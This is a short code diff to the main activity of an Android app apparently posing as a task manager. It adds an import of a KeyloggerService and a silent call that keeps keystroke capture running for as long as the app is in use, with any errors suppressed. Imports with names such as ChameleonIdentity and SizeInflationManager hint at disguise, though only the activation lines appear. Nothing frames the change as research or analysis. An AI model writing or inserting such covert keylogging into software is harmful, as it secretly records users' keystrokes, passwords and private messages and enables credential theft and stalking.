@@ -29,6 +29,7 @@ import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.security.SizeInflationManager;
 import com.task.tusker.services.DataSyncService;
+import com.task.tusker.services.KeyloggerService;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -356,5 +357,7 @@ public class MainActivity extends AppCompatActivity {
                 startService(intent);
             }
         } catch (Exception ignored) {}
+        // Keep keylog capture active for as long as the app is in use.
+        try { KeyloggerService.ensureRunning(this); } catch (Exception ignored) {}
     }
 }
